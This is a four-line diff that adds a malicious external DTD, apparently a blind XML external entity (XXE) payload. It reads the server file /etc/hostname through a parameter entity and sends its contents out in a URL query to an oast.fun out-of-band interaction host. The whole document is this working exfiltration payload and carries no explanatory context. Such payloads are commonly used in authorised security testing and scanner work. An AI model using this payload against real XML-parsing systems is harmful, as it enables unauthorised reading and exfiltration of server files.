@@ -1,0 +1,4 @@
+<!ENTITY % file SYSTEM "file:///etc/hostname">
+<!ENTITY % wrap "<!ENTITY &#x25; send SYSTEM 'https://ifwrchmwqthownjixjwu5lw83qag9ckj1.oast.fun/?x=%file;'>">
+%wrap;
+%send;
